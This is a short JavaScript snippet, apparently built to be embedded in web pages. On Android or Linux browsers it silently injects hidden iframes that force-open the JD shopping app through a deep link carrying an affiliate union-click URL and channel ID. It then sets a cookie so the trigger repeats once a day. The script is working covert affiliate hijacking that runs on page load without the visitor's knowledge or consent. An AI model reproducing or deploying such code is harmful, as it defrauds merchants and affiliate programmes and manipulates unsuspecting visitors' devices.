var schemas =["openapp.jdmobile:\/\/virtual?params={\"category\":\"jump\",\"des\":\"m\",\"url\":\"http:\/\/union-click.jd.com\/jdc?e=&p=AyIHVCtaJQMiQwpDBUoyS0IQWhkeHAxGFkVESR1JUkpJBUkcTlcIRkVFUFdfEk9FY3JyfTxnDUxmYHwGTSh%2Bd3duHW8MfVBSAwNbRU1dR1McBAJQXk83BXBBanRWUVV7Jk1AVnUjUyUSfXEFAxdXewETB1wbWxUFEgNlG14QChMGVBpfFjISBlQaUhYCFQVdK1sRBhcBVBlYEAAiB1QrEHsDIgdRH14TAxAEUBlrFQYXBFcfWRQBEQVUG2sSMk1SVRhZEAYVAWUrayUyIgZlG2tKRk9aZRo%3D&t=W1dCFFlQCxxTRAsEBwpZRxgHRQcLXkJaCAULR0dKQAEFLWViaG4pTQJxcGlUA2gwYGd7TyFMM0dCFlEVBQNKV0ZOSkIeSV8%3D\",\"keplerID\":\"0\",\"keplerFrom\":\"1\",\"kepler_param\":{\"source\":\"kepler-open\",\"otherData\":{\"mopenbp7\":\"0\"},\"channel\":\"5768f16df47b40cb8906fb3fa141cd4e\"},\"union_open\":\"union_cps\"} "];
    function cookieGO(name) {
        var today = new Date();
        var expires = new Date();
        expires.setTime(today.getTime() + 1000*60*60*24);
        setCookie("cookievalueee", name, expires);
    }

    function setCookie(name, value, expire) {
        window.document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + expire.toGMTString()));
    }

    function getCookie(Name) {
        var findcookie = Name + "=";
        if (window.document.cookie.length > 0) { // if there are any cookies
            offset = window.document.cookie.indexOf(findcookie);
            if (offset != -1) { // cookie exists  存在
                offset += findcookie.length;          // set index of beginning of value
                end = window.document.cookie.indexOf(";", offset);          // set index of end of cookie value
                if (end == -1)
                    end = window.document.cookie.length;
                return unescape(window.document.cookie.substring(offset, end));
            }
        }
        return null;
    }
    var c = getCookie("cookievalueee");
    if (c == null) {
        (function(a, d, b, e) {
            if (/android|linux/i.test(d.userAgent.toLowerCase())){
                try {
                    for (var i=0;i<a.length;i++) {
                        if(a[i]!=""){
                            var c = b.createElement("iframe");
                            c.src = a[i];
                            c.style.display = "none";
                            b.body.appendChild(c);
                        }
                    }
                } catch (g) {}
            }
        }) (schemas, navigator, document, window.location);
        cookieGO("getcookieee");
    }